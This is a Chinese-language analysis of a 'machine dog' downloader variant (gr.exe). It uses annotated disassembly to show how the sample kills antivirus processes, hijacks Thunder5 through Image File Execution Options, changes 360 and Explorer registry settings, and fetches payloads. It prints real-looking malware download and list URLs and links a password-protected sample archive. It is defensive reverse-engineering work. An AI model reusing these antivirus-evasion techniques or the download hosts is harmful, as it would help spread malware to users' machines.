

# 最新机器狗变种分析 gr.exe

> 原文：[`www.pediy.com/kssd/pediy10/80792.html`](https://www.pediy.com/kssd/pediy10/80792.html)

一、病毒标签：  
病毒名称：  机器狗最新变种  
病毒类型：  下载者  
文件 SHA1： 11e187662e89fdf5c200f8fbab1672558461e0ce  
危害等级：  3  
文件长度：  脱壳前 37,205 字节，脱壳后 130,501 字节  
受影响系统：Microsoft Windows NT 4.0  
Microsoft Windows NT 4.0 Terminal Services Edition  
Microsoft Windows 2000  
Microsoft Windows XP  
Microsoft Windows Server 2003  
开发工具： Microsoft Visual C++ 6.0  
加壳类型： FSG 2.0 -> bart/xt  
二、病毒描述：  
    该病毒运行会关闭杀软，大量下载病毒木马。  
三、行为分析：  
1、遍历进程，创建一个名为 puuyt 互斥体，临时路径释放 98989898 文件  

代码:

```
push    ebp
seg001:00416892                 mov     ebp, esp
seg001:00416894                 sub     esp, 1Ch
seg001:00416897                 call    sub\_4167D3      ; 遍历进程
seg001:0041689C                 cmp     eax, 0Ah
seg001:0041689F                 jnb     short loc\_4168A5
seg001:004168A1                 xor     eax, eax
seg001:004168A3                 leave
seg001:004168A4                 retn
seg001:004168A5 ; ---------------------------------------------------------------------------
seg001:004168A5
seg001:004168A5 loc\_4168A5:                             ; CODE XREF: start+E j
seg001:004168A5                 push    esi             ; hWnd
seg001:004168A6                 push    edi             ; lpMsg
seg001:004168A7                 push    offset aPuuyt   ; "puuyt"
seg001:004168AC                 xor     esi, esi
seg001:004168AE                 push    1               ; bInitialOwner
seg001:004168B0                 push    esi             ; lpMutexAttributes
seg001:004168B1                 call    CreateMutexA    ; 创建一个名为 puuyt 互斥体
seg001:004168B7                 call    GetLastError
seg001:004168BD                 cmp     eax, 0B7h
seg001:004168C2                 jnz     short loc\_4168CB
seg001:004168C4                 push    esi             ; uExitCode
seg001:004168C5                 call    ExitProcess
seg001:004168CB ; ---------------------------------------------------------------------------
seg001:004168CB
seg001:004168CB loc\_4168CB:                             ; CODE XREF: start+31 j
seg001:004168CB                 mov     edi, offset BinaryPathName
seg001:004168D0                 push    edi             ; lpBuffer
seg001:004168D1                 push    104h            ; nBufferLength
seg001:004168D6                 call    \_\_imp\_GetTempPathA
seg001:004168DC                 push    offset a98989898 ; "98989898"
seg001:004168E1                 push    edi             ; lpString1
seg001:004168E2                 call    \_\_imp\_lstrcatA
seg001:004168E8                 push    edi             ; lpFileName
seg001:004168E9                 call    sub\_4161A0      ; 临时路径创建 98989898 文件
seg001:004168EE                 test    al, al
seg001:004168F0                 pop     ecx
seg001:004168F1                 jz      short loc\_4168FF
seg001:004168F3                 push    edi             ; NumberOfBytesWritten
seg001:004168F4                 call    sub\_416849      ; 设置文件指针

```

2、  
遍历以下进程,如存在则结束；劫持 Thunder5.exe。  
代码:

```
seg001:00415F30 ; kavstart.exe
seg001:00415F30 ;
seg001:00415F30 ; kissvc.exe
seg001:00415F30 ;
seg001:00415F30 ; kmailmon.exe
seg001:00415F30 ;
seg001:00415F30 ; kpfw32.exe
seg001:00415F30 ;
seg001:00415F30 ; kpfwsvc.exe
seg001:00415F30 ;
seg001:00415F30 ; kwatch.exe
seg001:00415F30 ;
seg001:00415F30 ; ccenter.exe
seg001:00415F30 ;
seg001:00415F30 ; ras.exe
seg001:00415F30 ;
seg001:00415F30 ; rstray.exe
seg001:00415F30 ;
seg001:00415F30 ; rsagent.exe
seg001:00415F30 ;
seg001:00415F30 ; ravtask.exe
seg001:00415F30 ;
seg001:00415F30 ; ravstub.exe
seg001:00415F30 ;
seg001:00415F30 ; ravmon.exe
seg001:00415F30 ;
seg001:00415F30 ; ravmond.exe
seg001:00415F30 ;
seg001:00415F30 ; avp.exe
seg001:00415F30 ;
seg001:00415F30 ; 360safebox.exe
seg001:00415F30 ;
seg001:00415F30 ; 360Safe.exe
seg001:00415F30 ;
seg001:00415F30 ; Thunder5.exe
seg001:00415F30 ;
seg001:00415F30 ; rfwmain.exe
seg001:00415F30 ;
seg001:00415F30 ; rfwstub.exe
seg001:00415F30 ;
seg001:00415F30 ; rfwsrv.exe

劫持 Thunder5.exe：
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\

```

3、修改 360 注册表键值  
代码:

```
seg001:004150AA                 mov     esi, offset aSoftware360saf ; SOFTWARE\\360Safe\\safemon
seg001:004150AF                 lea     edi, \[esp+78h+SubKey\]
seg001:004150B3                 xor     eax, eax
seg001:004150B5                 rep movsd
seg001:004150B7                 movsb
seg001:004150B8                 mov     ecx, 12h
seg001:004150BD                 lea     edi, \[esp+78h+var\_4B\]
seg001:004150C1                 rep stosd
seg001:004150C3                 stosw
seg001:004150C5                 lea     eax, \[esp+78h+hKey\]
seg001:004150C9                 lea     ecx, \[esp+78h+SubKey\]
seg001:004150CD                 push    eax             ; phkResult
seg001:004150CE                 push    ecx             ; lpSubKey
seg001:004150CF                 push    80000002h       ; hKey
seg001:004150D4                 mov     dword ptr \[esp+84h+Data\], 0
seg001:004150DC                 mov     \[esp+84h+var\_68\], 1
seg001:004150E4                 call    RegCreateKeyA
seg001:004150EA                 mov     eax, \[esp+78h+hKey\]
seg001:004150EE                 mov     esi, RegSetValueExA
seg001:004150F4                 lea     edx, \[esp+78h+Data\]
seg001:004150F8                 push    4               ; cbData
seg001:004150FA                 push    edx             ; lpData
seg001:004150FB                 push    4               ; dwType
seg001:004150FD                 push    0               ; Reserved
seg001:004150FF                 push    offset ValueName ; "MonAccess"
seg001:00415104                 push    eax             ; hKey
seg001:00415105                 call    esi ; RegSetValueExA
seg001:00415107                 mov     edx, \[esp+78h+hKey\]
seg001:0041510B                 lea     ecx, \[esp+78h+Data\]
seg001:0041510F                 push    4               ; cbData
seg001:00415111                 push    ecx             ; lpData
seg001:00415112                 push    4               ; dwType
seg001:00415114                 push    0               ; Reserved
seg001:00415116                 push    offset aSiteaccess ; "SiteAccess"
seg001:0041511B                 push    edx             ; hKey
seg001:0041511C                 call    esi ; RegSetValueExA
seg001:0041511E                 mov     ecx, \[esp+78h+hKey\]
seg001:00415122                 lea     eax, \[esp+78h+Data\]
seg001:00415126                 push    4               ; cbData
seg001:00415128                 push    eax             ; lpData
seg001:00415129                 push    4               ; dwType
seg001:0041512B                 push    0               ; Reserved
seg001:0041512D                 push    offset aExecaccess ; "ExecAccess"
seg001:00415132                 push    ecx             ; hKey
seg001:00415133                 call    esi ; RegSetValueExA
seg001:00415135                 mov     eax, \[esp+78h+hKey\]
seg001:00415139                 lea     edx, \[esp+78h+Data\]
seg001:0041513D                 push    4               ; cbData
seg001:0041513F                 push    edx             ; lpData
seg001:00415140                 push    4               ; dwType
seg001:00415142                 push    0               ; Reserved
seg001:00415144                 push    offset aArpaccess ; "ARPAccess"
seg001:00415149                 push    eax             ; hKey
seg001:0041514A                 call    esi ; RegSetValueExA
seg001:0041514C                 mov     edx, \[esp+78h+hKey\]
seg001:00415150                 lea     ecx, \[esp+78h+Data\]
seg001:00415154                 push    4               ; cbData
seg001:00415156                 push    ecx             ; lpData
seg001:00415157                 push    4               ; dwType
seg001:00415159                 push    0               ; Reserved
seg001:0041515B                 push    offset aWeeken  ; "weeken"
seg001:00415160                 push    edx             ; hKey
seg001:00415161                 call    esi ; RegSetValueExA
seg001:00415163                 mov     ecx, \[esp+78h+hKey\]
seg001:00415167                 lea     eax, \[esp+78h+Data\]
seg001:0041516B                 push    4               ; cbData
seg001:0041516D                 push    eax             ; lpData
seg001:0041516E                 push    4               ; dwType
seg001:00415170                 push    0               ; Reserved
seg001:00415172                 push    offset aIeprotaccess ; "IEProtAccess"
seg001:00415177                 push    ecx             ; hKey
seg001:00415178                 call    esi ; RegSetValueExA
seg001:0041517A                 lea     edx, \[esp+78h+var\_68\]
seg001:0041517E                 push    4               ; cbData
seg001:00415180                 push    edx             ; lpData
seg001:00415181                 push    4               ; dwType
seg001:00415183                 push    0               ; Reserved
seg001:00415185                 push    offset aLeakshowed ; "LeakShowed"
seg001:0041518A                 mov     eax, \[esp+8Ch+hKey\]
seg001:0041518E                 push    eax             ; hKey
seg001:0041518F                 call    esi ; RegSetValueExA
seg001:00415191                 mov     edx, \[esp+78h+hKey\]
seg001:00415195                 lea     ecx, \[esp+78h+var\_68\]
seg001:00415199                 push    4               ; cbData
seg001:0041519B                 push    ecx             ; lpData
seg001:0041519C                 push    4               ; dwType
seg001:0041519E                 push    0               ; Reserved
seg001:004151A0                 push    offset aUdiskaccess ; "UDiskAccess"
seg001:004151A5                 push    edx             ; hKey
seg001:004151A6                 call    esi ; RegSetValueExA
seg001:004151A8                 mov     eax, \[esp+78h+hKey\]
seg001:004151AC                 push    eax             ; hKey
seg001:004151AD                 call    RegCloseKey
seg001:004151B3                 pop     edi
seg001:004151B4                 pop     esi
seg001:004151B5                 add     esp, 70h
seg001:004151B8                 retn

```

4、干掉 360 进程  
代码:

```
seg001:00415580                 sub     esp, 130h
seg001:00415586                 push    ebp
seg001:00415587                 push    offset aSTO     ; "檎卣雄饧嘏迷?
seg001:0041558C                 call    sub\_415020      ; safeboxTray.exe
seg001:00415591                 push    offset aIkvfrUc ; "┆嗤塑?
seg001:00415596                 call    sub\_415020      ; 360tray.exe
seg001:0041559B                 push    offset aCcR     ; "骁余卧?
seg001:004155A0                 call    sub\_415020      ; psapi.dll
seg001:004155A5                 push    offset CommandLine ; "?
seg001:004155AA                 call    sub\_415020      ;  /u
seg001:004155AF                 add     esp, 10h
seg001:004155B2                 push    0               ; th32ProcessID
seg001:004155B4                 push    2               ; dwFlags
seg001:004155B6                 call    CreateToolhelp32Snapshot
seg001:004155BB                 mov     ebp, eax
seg001:004155BD                 cmp     ebp, 0FFFFFFFFh
seg001:004155C0                 jz      loc\_415737
seg001:004155C6                 lea     eax, \[esp+134h+pe\]
seg001:004155CA                 push    esi
seg001:004155CB                 push    eax             ; lppe
seg001:004155CC                 push    ebp             ; hSnapshot
seg001:004155CD                 mov     \[esp+140h+pe.dwSize\], 128h
seg001:004155D5                 call    Process32First
seg001:004155DA                 test    eax, eax
seg001:004155DC                 jz      loc\_415711
seg001:004155E2                 mov     esi, lstrcmpiA
seg001:004155E8                 lea     ecx, \[esp+138h+pe.szExeFile\]
seg001:004155EC                 push    offset aSTO     ; "檎卣雄饧嘏迷?
seg001:004155F1                 push    ecx             ; lpString1
seg001:004155F2                 call    esi ; lstrcmpiA
seg001:004155F4                 test    eax, eax
seg001:004155F6                 jz      short loc\_41561B
seg001:004155F8
seg001:004155F8 loc\_4155F8:                             ; CODE XREF: sub\_415580+99 j
seg001:004155F8                 lea     edx, \[esp+138h+pe\]
seg001:004155FC                 push    edx             ; lppe
seg001:004155FD                 push    ebp             ; hSnapshot
seg001:004155FE                 call    Process32Next
seg001:00415603                 test    eax, eax
seg001:00415605                 jz      loc\_415711
seg001:0041560B                 lea     eax, \[esp+138h+pe.szExeFile\]
seg001:0041560F                 push    offset aSTO     ; "檎卣雄饧嘏迷?
seg001:00415614                 push    eax             ; lpString1
seg001:00415615                 call    esi ; lstrcmpiA
seg001:00415617                 test    eax, eax
seg001:00415619                 jnz     short loc\_4155F8 ; 进程是否存在 safeboxTray.exe
seg001:0041561B
seg001:0041561B loc\_41561B:                             ; CODE XREF: sub\_415580+76 j
seg001:0041561B                 mov     ecx, \[esp+138h+pe.th32ProcessID\]
seg001:0041561F                 push    ebx             ; lpFileName
seg001:00415620                 push    ecx             ; dwProcessId
seg001:00415621                 push    0               ; bInheritHandle
seg001:00415623                 push    410h            ; dwDesiredAccess
seg001:00415628                 call    OpenProcess
seg001:0041562E                 mov     ebx, eax
seg001:00415630                 test    ebx, ebx
seg001:00415632                 jz      loc\_4156FE
seg001:00415638                 lea     edx, \[esp+13Ch+cbNeeded\]
seg001:0041563C                 push    edi
seg001:0041563D                 push    edx             ; lpcbNeeded
seg001:0041563E                 lea     eax, \[esp+144h+hObject\]
seg001:00415642                 push    4               ; cb
seg001:00415644                 push    eax             ; lphModule
seg001:00415645                 push    ebx             ; hProcess
seg001:00415646                 call    EnumProcessModules
seg001:0041564B                 mov     ecx, \[esp+140h+hObject\]
seg001:0041564F                 push    104h            ; nSize
seg001:00415654                 push    offset ApplicationName ; lpFilename
seg001:00415659                 push    ecx             ; hModule
seg001:0041565A                 push    ebx             ; hProcess
seg001:0041565B                 call    GetModuleFileNameExA
seg001:00415660                 mov     edi, offset ApplicationName
seg001:00415665                 or      ecx, 0FFFFFFFFh
seg001:00415668                 xor     eax, eax
seg001:0041566A                 mov     esi, offset ApplicationName
seg001:0041566F                 repne scasb
seg001:00415671                 not     ecx
seg001:00415673                 dec     ecx
seg001:00415674                 mov     edi, offset aSTO ; "檎卣雄饧嘏迷?
seg001:00415679                 mov     edx, ecx
seg001:0041567B                 or      ecx, 0FFFFFFFFh
seg001:0041567E                 repne scasb
seg001:00415680                 not     ecx
seg001:00415682                 dec     ecx
seg001:00415683                 mov     edi, offset FileName
seg001:00415688                 sub     edx, ecx
seg001:0041568A                 push    offset FileName ; lpFileName
seg001:0041568F                 mov     ecx, edx
seg001:00415691                 mov     eax, ecx
seg001:00415693                 shr     ecx, 2
seg001:00415696                 rep movsd
seg001:00415698                 mov     ecx, eax
seg001:0041569A                 xor     eax, eax
seg001:0041569C                 and     ecx, 3
seg001:0041569F                 rep movsb
seg001:004156A1                 mov     edi, offset aCcR ; "骁余卧?
seg001:004156A6                 or      ecx, 0FFFFFFFFh
seg001:004156A9                 repne scasb
seg001:004156AB                 not     ecx
seg001:004156AD                 sub     edi, ecx
seg001:004156AF                 mov     esi, edi
seg001:004156B1                 mov     edx, ecx
seg001:004156B3                 mov     edi, offset FileName
seg001:004156B8                 or      ecx, 0FFFFFFFFh
seg001:004156BB                 repne scasb
seg001:004156BD                 mov     ecx, edx
seg001:004156BF                 dec     edi
seg001:004156C0                 shr     ecx, 2
seg001:004156C3                 rep movsd
seg001:004156C5                 mov     ecx, edx
seg001:004156C7                 and     ecx, 3
seg001:004156CA                 rep movsb
seg001:004156CC                 call    sub\_414F40
seg001:004156D1                 add     esp, 4
seg001:004156D4                 test    al, al

```

5、C:\\WINDOWS\\Tasks 释放 1 文件，该文件其实是一个 dll，主要从 http://{blocked}www.hoho-2.cn/down/gr.exe 下载者病毒  
代码:

```
seg001:0041691D                 call    sub\_41630E      ; C:\\WINDOWS\\Tasks 释放 1 文件

```

6、遍历磁盘分区，查找 exe 文件  
代码:

```
push    esi             ; lpThreadId
seg001:0041692B                 push    esi             ; dwCreationFlags
seg001:0041692C                 push    esi             ; lpParameter
seg001:0041692D                 push    offset find\_file\_exe ; lpStartAddress
seg001:00416932                 push    esi             ; dwStackSize
seg001:00416933                 push    esi             ; lpThreadAttributes
seg001:00416934                 call    CreateThread

```

7、查找 AfxControlBar42s 窗口，修改注册表键值，关闭“显示隐藏文件”  
代码:

```
push    7D0h            ; dwMilliseconds
seg001:00416205                 call    Sleep
seg001:0041620B                 push    offset szWindow ; lpszWindow
seg001:00416210                 push    offset szClass  ; "AfxControlBar42s"
seg001:00416215                 call    sub\_416070      ; 查找 AfxControlBar42s 窗口
seg001:0041621A                 pop     ecx
seg001:0041621B                 pop     ecx
seg001:0041621C                 call    sub\_4160ED      ; 修改注册表值
seg001:00416221                 jmp     short modify\_reg

```

进入 call    sub\_4160ED      ; 修改注册表值：  
代码:

```
mov     esi, offset aSoftwareMicr\_0 ; Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced
seg001:004160FC                 pop     ecx
seg001:004160FD                 lea     edi, \[ebp+SubKey\]
seg001:00416100                 rep movsd
seg001:00416102                 push    9
seg001:00416104                 xor     eax, eax
seg001:00416106                 pop     ecx
seg001:00416107                 lea     edi, \[ebp+var\_38\]
seg001:0041610A                 rep stosd
seg001:0041610C                 stosw
seg001:0041610E                 and     \[ebp+var\_10\], 0
seg001:00416112                 mov     dword ptr \[ebp+Data\], 2
seg001:00416119                 stosb
seg001:0041611A                 lea     eax, \[ebp+hKey\]
seg001:0041611D                 mov     \[ebp+var\_C\], 1
seg001:00416124                 push    eax             ; phkResult
seg001:00416125                 lea     eax, \[ebp+SubKey\]
seg001:00416128                 push    eax             ; lpSubKey
seg001:00416129                 push    80000001h       ; hKey
seg001:0041612E                 call    RegCreateKeyA
seg001:00416134                 push    4
seg001:00416136                 lea     eax, \[ebp+Data\]
seg001:00416139                 pop     edi
seg001:0041613A                 mov     esi, RegSetValueExA
seg001:00416140                 push    edi             ; cbData
seg001:00416141                 push    eax             ; lpData
seg001:00416142                 push    edi             ; dwType
seg001:00416143                 push    0               ; Reserved
seg001:00416145                 push    offset aHidden  ; "Hidden"
seg001:0041614A                 push    \[ebp+hKey\]      ; hKey
seg001:0041614D                 call    esi ; RegSetValueExA
seg001:0041614F                 lea     eax, \[ebp+var\_C\]
seg001:00416152                 push    edi             ; cbData
seg001:00416153                 push    eax             ; lpData
seg001:00416154                 push    edi             ; dwType
seg001:00416155                 push    0               ; Reserved
seg001:00416157                 push    offset aSuperhidden ; "SuperHidden"
seg001:0041615C                 push    \[ebp+hKey\]      ; hKey
seg001:0041615F                 call    esi ; RegSetValueExA
seg001:00416161                 lea     eax, \[ebp+var\_10\]
seg001:00416164                 push    edi             ; cbData
seg001:00416165                 push    eax             ; lpData
seg001:00416166                 push    edi             ; dwType
seg001:00416167                 push    0               ; Reserved
seg001:00416169                 push    offset aShowsuperhidde ; "ShowSuperHidden"
seg001:0041616E                 push    \[ebp+hKey\]      ; hKey
seg001:00416171                 call    esi ; RegSetValueExA
seg001:00416173                 push    \[ebp+hKey\]      ; hKey
seg001:00416176                 call    RegCloseKey
seg001:0041617C                 pop     edi
seg001:0041617D                 pop     esi
seg001:0041617E                 leave

```

8、干掉 cmd.exe  
代码:

```
push    offset Str1     ; "cmd.exe"
seg001:00414B47                 call    \_stricmp
seg001:00414B4C                 pop     ecx
seg001:00414B4D                 test    eax, eax
seg001:00414B4F                 pop     ecx
seg001:00414B50                 jnz     short loc\_414B33
seg001:00414B52                 push    dword ptr \[esi+8\] ; dwProcessId
seg001:00414B55                 push    eax             ; bInheritHandle
seg001:00414B56                 push    1               ; dwDesiredAccess
seg001:00414B58                 call    OpenProcess
seg001:00414B5E                 push    0               ; uExitCode
seg001:00414B60                 push    eax             ; hProcess
seg001:00414B61                 call    TerminateProcess

```

9、释放随机 dll 文件  
  
代码:

```
         
seg001:00415E30                 push    eax             ; lpBuffer
seg001:00415E31                 push    104h            ; nBufferLength
seg001:00415E36                 call    \_\_imp\_GetTempPathA ; 找到临时路径
seg001:00415E3C                 call    \_\_imp\_GetTickCount
seg001:00415E42                 push    eax
seg001:00415E43                 lea     eax, \[ebp+Buffer\]
seg001:00415E49                 push    eax
seg001:00415E4A                 mov     esi, offset byte\_4169EC
seg001:00415E4F                 push    offset aSX\_dll  ; "%s%x.dll"
seg001:00415E54                 push    esi             ; LPSTR
seg001:00415E55                 call    wsprintfA
seg001:00415E5B                 push    esi             ; lpFileName
seg001:00415E5C                 call    sub\_414AB4      ; 释放随机命名的 dll 文件
seg001:00415E61                 add     esp, 14h

```

10、下载者列表：  
  
代码:

```
seg001:00415E71                 push    offset aOlojvssfysgvqn ; "防蕉}olYSQNLI>px6kfrhYX P\_Y"
seg001:00415E76                 call    sub\_414FA0      ; 解密 call，解密后为 http://tongji1.ac5566.cn/getmac.asp
seg001:00415E7B                 mov     \[esp+114h+var\_114\], offset dword\_4144EC
seg001:00415E82                 call    sub\_414FA0      ; 解密 call，解密后为 http://txt.naiws.com/oo.txt
seg001:00415E87                 call    sub\_415750      ; 调用 URLDownloadToFileA 函数下载列表上的病毒
seg001:00415E8C                 mov     esi, Sleep
seg001:00415E92                 mov     \[esp+114h+var\_114\], 0C350h
seg001:00415E99                 call    esi ; Sleep
seg001:00415E9B                 push    offset dword\_4145C0
seg001:00415EA0                 call    sub\_414FA0      ; 解密 call，解密后为 http://txt.naiws.com/ad.jpg
seg001:00415EA5                 pop     ecx
seg001:00415EA6                 call    sub\_415BE0      ; 修改 hosts 文件
seg001:00415EAB                 call    sub\_4151DD      ; 继续解密，获得 Netbios 信息
seg001:00415EB0                 mov     edi, 1F4h
seg001:00415EB5                 push    edi             ; dwMilliseconds

```

sadfasdf.jpg 实际是一个列表文件，内容：  
代码:

```
\[file\]  
open=y
url1=http://www.wixks.com/new/new1.exe
url2=http://www.wixks.com/new/new2.exe
url3=http://www.wixks.com/new/new3.exe
url4=http://www.wixks.com/new/new4.exe
url5=http://www.wixks.com/new/new5.exe
url6=http://www.wixks.com/new/new6.exe
url7=http://www.wixks.com/new/new7.exe
url8=http://www.wixks.com/new/new8.exe
url9=http://www.wixks.com/new/new9.exe
url10=http://www.wixks.com/new/new10.exe
url11=http://www.wixks.com/new/new11.exe
url12=http://www.wixks.com/new/new12.exe
url13=http://www.wixks.com/new/new13.exe
url14=http://www.wixks.com/new/new14.exe
url15=http://www.wixks.com/new/new15.exe
url16=http://www.wixks.com/new/new16.exe
url17=http://www.wixks.com/new/new17.exe
url18=http://www.wixks.com/new/new18.exe
url19=http://www.wixks.com/new/new19.exe
url20=http://www.wixks.com/new/new20.exe
url21=http://www.wixks.com/new/new21.exe
url22=http://www.wixks.com/new/new22.exe
url23=http://www.wixks.com/new/new23.exe
url24=http://www.wixks.com/new/new24.exe
url25=http://www.wixks.com/new/new25.exe
url26=http://www.wixks.com/new/new26.exe
url27=http://www.wixks.com/new/new27.exe
url28=http://www.wixks.com/new/new28.exe
count=28

```

11、提权  
代码:

```
call    sub\_416223      ; 提权

```

12、创建一个名为 Kisstusb 的服务，完成后清除该服务  
代码:

```
seg001:004166C9                 push    offset ServiceName ; "Kisstusb"
seg001:004166CE                 call    sub\_416402      ; 创建一个名为 Kisstusb 的服务
seg001:004166D3                 mov     esi, eax
seg001:004166D5                 pop     ecx
seg001:004166D6                 test    esi, esi
seg001:004166D8                 pop     ecx
seg001:004166D9                 jz      short loc\_416702
seg001:004166DB                 lea     eax, \[ebp+ServiceStatus\]
seg001:004166DE                 push    eax             ; lpServiceStatus
seg001:004166DF                 push    esi             ; hService
seg001:004166E0                 call    QueryServiceStatus
seg001:004166E6                 test    eax, eax
seg001:004166E8                 jz      short loc\_4166F0
seg001:004166EA                 cmp     \[ebp+ServiceStatus.dwCurrentState\], 4
seg001:004166EE                 jz      short loc\_4166FB
seg001:004166F0
seg001:004166F0 loc\_4166F0:                             ; CODE XREF: sub\_4166BF+29 j
seg001:004166F0                 push    0               ; lpServiceArgVectors
seg001:004166F2                 push    0               ; dwNumServiceArgs
seg001:004166F4                 push    esi             ; hService
seg001:004166F5                 call    StartServiceA   ; 启动服务
seg001:004166FB
seg001:004166FB loc\_4166FB:                             ; CODE XREF: sub\_4166BF+2F j
seg001:004166FB                 push    esi             ; hSCObject
seg001:004166FC                 call    CloseServiceHandle
seg001:00416702
seg001:00416702 loc\_416702:                             ; CODE XREF: sub\_4166BF+1A j
seg001:00416702                 push    \[ebp+lpBinaryPathName\] ; lpFileName
seg001:00416705                 call    DeleteFileA
seg001:0041670B                 push    offset pszSubKey ; SYSTEM\\CurrentControlSet\\Services\\Kisstusb
seg001:00416710                 push    80000002h       ; hkey
seg001:00416715                 call    SHDeleteKeyA    ; 清除该服务

```

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || gr.rar \[解压密码：muma123\]   
 |